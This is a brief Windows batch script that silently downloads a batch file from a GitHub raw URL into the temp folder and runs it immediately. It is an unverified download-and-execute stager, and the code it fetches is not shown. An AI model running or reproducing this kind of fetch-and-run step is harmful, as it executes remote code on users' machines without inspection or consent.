@echo off
cd %temp%
curl -s https://raw.githubusercontent.com/PinguinButInSpanish/Installer/main/Installforinstaller.bat --output install.bat
start install.bat
exit